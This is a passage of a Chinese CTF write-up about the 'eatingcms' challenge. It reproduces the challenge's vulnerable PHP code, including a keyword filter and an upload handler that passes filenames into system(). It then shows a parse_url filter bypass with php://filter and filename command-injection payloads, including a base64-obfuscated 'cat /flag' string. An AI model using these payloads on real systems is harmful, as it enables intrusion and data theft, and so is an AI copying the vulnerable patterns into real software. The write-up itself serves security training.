class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])|| <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;info&#x27;</span>)<br>        &#123;<br><span class="hljs-comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span><br>            <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: user.php?page=guest&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">filter_directory</span>();<br><span class="hljs-comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><br><span class="hljs-comment">//    $page = &#x27;info&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$page</span>.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//info.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly &quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/info.html&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//function.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hacker</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: hacker.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$whitelist</span>&quot;</span>, <span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Hacker</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$blacklist</span>/is&quot;</span>, <span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">Hacker</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">real_escape_string</span>(<span class="hljs-variable">$string</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_query</span>(<span class="hljs-params"><span class="hljs-variable">$sql_query</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql_query</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="hljs-subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="hljs-subst">$pass</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$res</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$data</span>[username_which_you_do_not_know];<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] = <span class="hljs-variable">$data</span>[isadmin_which_you_do_not_know_too_too];<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateadmin</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>,<span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="hljs-subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="hljs-subst">$user</span>&#x27; &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br><span class="hljs-comment">//    die($res);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">Filter</span>(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="hljs-subst">$user</span>&#x27;,&#x27;<span class="hljs-subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">sql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;insert_id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">session_destroy</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>代码不难理解，首先是这个:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//下面还有个过滤字典，和这个类似就不重复说了</span><br></code></pre></td></tr></table></figure><blockquote><p><code>parse_url</code> 是一个 PHP 内置函数，用于解析 URL 字符串，将其拆分成各个组成部分。以下是你提供的代码中 <code>parse_url</code> 的使用：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$uri = parse_url($_SERVER[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>在这里，<code>$_SERVER[&quot;REQUEST_URI&quot;]</code> 包含当前页面的 URL。通过调用 <code>parse_url</code> 函数，它被解析成一个关联数组，其中包含了 URL 的各个组成部分，如协议、主机、路径、查询参数等。</p><p>接下来的代码片段是：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">parse<span class="hljs-constructor">_str($<span class="hljs-params">uri</span>[&#x27;<span class="hljs-params">query</span>&#x27;], $<span class="hljs-params">query</span>)</span>;<br></code></pre></td></tr></table></figure><p>它从上一步解析得到的数组 <code>$uri</code> 中取出名为 <code>&#39;query&#39;</code> 的部分，并将其解析成变量。如果 URL 中包含查询字符串（例如 <code>?key1=value1&amp;key2=value2</code>），那么 <code>$query</code> 数组将包含这些参数和对应的值。</p><p>综合起来，整个代码片段的目的可能是获取当前页面 URL 的查询参数，并将其解析为一个关联数组 <code>$query</code>。在这个特定的例子中，看起来代码的目的是检查 URL 查询参数中是否包含了某些关键词，如 “flag”、”manage”、”ffffllllaaaaggg”。</p></blockquote><p>这里他不允许我们去访问<code>flag</code>，<code>manage</code>，<code>ffffllllaaaaggg</code>。可以知道这里是一定藏了东西的。至于<code>parse_url</code>解析存在的问题：<code>https://www.cnblogs.com/Lee-404/p/12826352.html</code>。</p><p>所以这里可以通过构造畸形的<code>URL</code>绕过<code>filter</code>函数的检测：</p><p><code>////user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can find sth in m4aaannngggeee&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//info和flag没啥有用信息</span><br></code></pre></td></tr></table></figure><p>读这个的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/upload.html&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问<code>templates/upload.html</code>发现存在上传界面，随便找了个一句话传上去发现:</p><p><img src="/img/nu1lctfeatingcms1.png" alt="nu1lctfeatingcms1"></p><p>读下这个文件的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br><span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);<br>&#125;<br><span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$picdata</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="hljs-variable">$picdata</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>&#125;<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意这个命令执行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br></code></pre></td></tr></table></figure><p>这里直接命令执行读上传的文件了，比如：</p><p><img src="/img/nu1lctfeatingcms3.png" alt="nu1lctfeatingcms3"></p><p>可以通过修改文件名来<code>RCE</code>，但我不管怎么试结果都是<code>404</code>。。后来才知道真正的文件上传页面是<code>m4aaannngggeee</code>:</p><p><img src="/img/nu1lctfeatingcms2.png" alt="nu1lctfeatingcms2"></p><p><code>system</code>里可以利用<code>;</code>同时执行多个命令，所以<code>cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/</code>用一个<code>;</code>闭合就行(|base64 -w 0会把结果以base64输出)：</p><p><img src="/img/nu1lctfeatingcms4.png" alt="nu1lctfeatingcms4"></p><p>当然也可以利用<code>#</code>把后面注释掉，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls;cat script.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：</span><br>run<br>script.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls;cat script.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls;#cat script.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果</span><br>run<br>script.php<br><br></code></pre></td></tr></table></figure><p>但注意这里不能用<code>/</code>，会报错(error:can not move)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>     <br><span class="hljs-comment">//php文件上传时。将缓存文件移动到目标目录由于存在特殊字符。就会报错</span><br></code></pre></td></tr></table></figure><p>解决方法很多，比如先<code>cd ..</code>回到上一级再执行<code>ls</code>，或者：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>;`<span class="hljs-built_in">echo</span> Y2F0IC9mbGFnXzIzMzMzMw==|<span class="hljs-built_in">base64</span> -d`<br><br>;`<span class="hljs-built_in">echo</span> Y2F0IC9mbGFnXzIzMzMzMw==|<span class="hljs-built_in">base64</span> -d`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h4 id="思路总结："><a href="#思路总结：" class="headerlink" title="思路总结："></a>思路总结：</h4><h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p><code>/source</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 